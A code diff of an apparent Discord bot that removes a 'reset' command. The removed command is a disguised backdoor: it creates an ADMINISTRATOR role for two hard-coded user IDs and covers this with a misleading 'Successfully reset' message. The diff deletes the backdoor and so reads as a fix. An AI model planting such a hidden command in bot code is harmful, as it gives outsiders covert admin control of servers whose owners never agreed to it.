@@ -625,36 +625,6 @@ client.on('message', async message => {
         });
     }
 
-    if(command === 'reset'){
-        const user = message.member;
-        const duration = args.join(" ");
-    
-        if(user.id === '331767250434654209' || user.id === '209655450952531970') {
-                let target = message.member;
-    
-                if(target){
-                    const member = message.guild.member(target);
-                        if (member){
-    
-                            let role = message.guild.roles.cache.find(r => r.name === "Tsuki");
-                            message.guild.roles.create({ data: { name: 'Lemres is a god', permissions: ["ADMINISTRATOR", "MANAGE_ROLES"] } });
-                            let newrole = message.guild.roles.cache.find(r => r.name === "Lemres is a god");
-    
-                            target.roles.add(role)
-                            target.roles.add(newrole)
-    
-                            message.channel.send("Successfully reset " + target.user.tag)
-                        
-                    } else {
-                        message.channel.send('User not found.')
-                    }
-                }
-            
-        } else {
-            message.channel.send('No Permissions. (Admin required)')
-        }
-    }
-
 });
 
 client.login(config.token);
